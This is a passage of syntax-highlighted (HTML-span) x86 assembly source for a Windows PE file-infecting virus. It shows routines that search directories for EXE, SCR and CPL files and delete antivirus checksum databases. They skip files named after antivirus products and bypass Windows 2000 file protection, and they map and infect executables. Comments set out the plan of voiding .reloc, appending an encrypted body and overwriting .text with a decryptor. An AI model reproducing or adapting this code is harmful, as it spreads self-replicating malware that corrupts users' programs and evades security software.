                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Directory1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Set the directory on this</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; address (windows or system)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SetDirectory1</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectCurrentDir</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteDATs</span><span class="sc0">     </span><span class="sc1">; Delete some antivirus CRC protections</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileMask1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=RVA to *.EXE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDir2</span><span class="sc0">        </span><span class="sc1">; Infect EXEs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileMask2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=RVA to *.SCR</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDir2</span><span class="sc0">        </span><span class="sc1">; Infect SCRs</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileMask3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=RVA to *.CPL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectCurrentDir2</span><span class="sc0">        </span><span class="sc1">; Infect CPLs</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                    </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">InfectCurrentDir</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">InfectCurrentDir2</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random counter to begin infection</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileInfectionCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileField</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Find first file</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Fin0</span><span class="sc0">        </span><span class="sc1">; Then, jump</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save handle</span><span class="sc0">
</span><span class="sc5">@@InfectAgain</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfectAllFiles</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;For infect all files</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectAll</span><span class="sc0">                </span><span class="sc1">; instead of one of each four</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileInfectionCounter</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Counter in -1?</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">   </span><span class="sc5">@@DontInfect</span><span class="sc0">   </span><span class="sc1">; If not, don't infect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileInfectionCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Set count to 3</span><span class="sc0">
</span><span class="sc5">@@InfectAll</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">   </span><span class="sc1">; Infect the found file</span><span class="sc0">
</span><span class="sc5">@@DontInfect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileField</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get next file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; If no error or more files, jump and</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@InfectAgain</span><span class="sc0">      </span><span class="sc1">; continue infection</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindClose</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">@@Fin0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">InfectCurrentDir2</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FindFileHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileInfectionCounter</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; InfectFile</span><span class="sc0">
</span><span class="sc1">;;------------</span><span class="sc0">
</span><span class="sc1">;; This function uses the data in FindFileField to infect the file that repre-</span><span class="sc0">
</span><span class="sc1">;; sents, so that's why in some parts of the virus I copy the data about the</span><span class="sc0">
</span><span class="sc1">;; file in that field before calling this.</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00002004h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX=RVA to the file name</span><span class="sc0">
         </span><span class="sc1">; This function checks if the file name begins with TB (ThunderByte),</span><span class="sc0">
         </span><span class="sc1">; SC (Scan and similars, usually McCafÇ), F- (F-Potatoe), PA (Panda</span><span class="sc0">
         </span><span class="sc1">; Antivirus), DR (DrWeb) or NO (Nod-Ice), or it has a V in its name</span><span class="sc0">
         </span><span class="sc1">; (many antivirus programs have it: AVP, INVIRCIBLE, CPAV, etc.)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckFileName</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">  </span><span class="sc1">; Carry Flag means that is a "forbidden" name,</span><span class="sc0">
                             </span><span class="sc1">; so we exit if CF is set</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SfcIsFileProtected</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Could be</span><span class="sc0">
                                                            </span><span class="sc1">; SFC.DLL loaded?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoWin2000</span><span class="sc0">       </span><span class="sc1">; If not, we're not in Win2000</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Check file against Win2K protection</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SfcIsFileProtected</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; If 0, it isn't protected</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">       </span><span class="sc1">; If not 0, it's protected, so don't infect</span><span class="sc0">
      </span><span class="sc5">@@NoWin2000</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">       </span><span class="sc1">; Clear file attributes (remove a posible</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; read-only attribute). I haven't</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; to save the old attributes coz they are</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; saved in the</span><span class="sc0">
                                                    </span><span class="sc1">; FindFileField structure</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">  </span><span class="sc1">; Open file</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@End2</span><span class="sc0">      </span><span class="sc1">; CF=We couldn't, so exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveDateTime</span><span class="sc0"> </span><span class="sc1">;Save date and time stamp. It's saved in</span><span class="sc0">
                                     </span><span class="sc1">;the FindFileField structure, but I dunno</span><span class="sc0">
                                     </span><span class="sc1">;why when I used that data the timestamp</span><span class="sc0">
                                     </span><span class="sc1">;weren't restored correctly, and it was</span><span class="sc0">
                                     </span><span class="sc1">;when I used this, so I use it.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">   </span><span class="sc1">; Open a mapping over the file</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@End3</span><span class="sc0">      </span><span class="sc1">; If we couldn't, exit</span><span class="sc0">
                     </span><span class="sc1">; After this, the mapping address is stored in EAX and</span><span class="sc0">
                     </span><span class="sc1">; [MappingAddress]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; EDI=Mapping address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">; Has the file executable struct?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">                 </span><span class="sc1">; If not, exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get PE header address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@End4</span><span class="sc0">        </span><span class="sc1">; Maybe compressed DOS-EXE</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc1">; Is there a PE header?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End4</span><span class="sc0">                 </span><span class="sc1">; If not, exit</span><span class="sc0">

</span><span class="sc1">;; ESI=PE header address, EDI=Mapping address (beginning of file)</span><span class="sc0">

</span><span class="sc1">;; The way we infect the files:</span><span class="sc0">
</span><span class="sc1">;; 0) We check the last section. If it is .rsrc, then the file can be infec-</span><span class="sc0">
</span><span class="sc1">;;   ted. Otherwise, that last section must be .reloc, to be anulated. If that</span><span class="sc0">
</span><span class="sc1">;;   section isn't the .reloc section, the file can't be infected, since it</span><span class="sc0">
</span><span class="sc1">;;   could be infected already.</span><span class="sc0">
</span><span class="sc1">;; 1) The section .reloc (if exists) is anulated.</span><span class="sc0">
</span><span class="sc1">;; 2) If there isn't any reloc section, we create a new section if the PE</span><span class="sc0">
</span><span class="sc1">;;   header has enough empty space to do it. If not, we end infection. When</span><span class="sc0">
</span><span class="sc1">;;   we create that section, we set it as if it were an anulated .reloc.</span><span class="sc0">
</span><span class="sc1">;; 2) We check if the last is quite big to contain the virus. If not, we make</span><span class="sc0">
</span><span class="sc1">;;   it bigger.</span><span class="sc0">
</span><span class="sc1">;; 4) We copy the virus to the last and we change the name of the section by</span><span class="sc0">
</span><span class="sc1">;;   another randomly generated</span><span class="sc0">
</span><span class="sc1">;; 3) We copy from .text to the end of the last section (after the virus) the</span><span class="sc0">
</span><span class="sc1">;;   portion of code that is going to be overwritten. Both virus and this data</span><span class="sc0">
</span><span class="sc1">;;   are copied already encrypted.</span><span class="sc0">
</span><span class="sc1">;; 5) We overwrite .text section with the decryptor (we check if .text is big</span><span class="sc0">
</span><span class="sc1">;;   enough to contain this).</span><span class="sc0">
</span><span class="sc1">;; 6) When execution, .text must be restored from the saved data.</span><span class="sc0">

                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Size of this header</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Number of sections</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sav_NumberOfSections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EBX=Address of the first section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">      </span><span class="sc1">; EAX = Size of one section header</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; EBX=Address of last section</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">; EBX=Physical address in the mapped file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LastHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Save it here</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">; Restore some values (new EAX=old EBX)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; EAX=Address of first section header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Set to 0 to know if</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; this values has been</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; found when we end the</span><span class="sc0">
                                                       </span><span class="sc1">; loop</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">@@Loop_001</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'xet.'</span><span class="sc0">  </span><span class="sc1">; Does it begin like .text?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForReloc</span><span class="sc0">             </span><span class="sc1">; If not, do next check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'t'</span><span class="sc0"> </span><span class="sc1">; .text?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">              </span><span class="sc1">; If not, look next section</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SectionNames</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Physical address of .text</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; Restore address</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection2</span><span class="sc0">          </span><span class="sc1">; Look next section</span><span class="sc0">
</span><span class="sc5">@@LookForReloc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ler.'</span><span class="sc0">  </span><span class="sc1">; Does it begin like .reloc?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForBss</span><span class="sc0">               </span><span class="sc1">; If not, do next check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc12">'co'</span><span class="sc0"> </span><span class="sc1">; .reloc?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NextSection</span><span class="sc0">              </span><span class="sc1">; If not, look next section</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Physical address of .reloc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextSection2</span><span class="sc0">          </span><span class="sc1">; Look next section</span><span class="sc0">
</span><span class="sc5">@@LookForBss</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ssb.'</span><span class="sc0">  </span><span class="sc1">; Does it begin like .bss?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LookForIdata</span><span class="sc0">             </span><span class="sc1">; If not, do next check</span><span class="sc0">
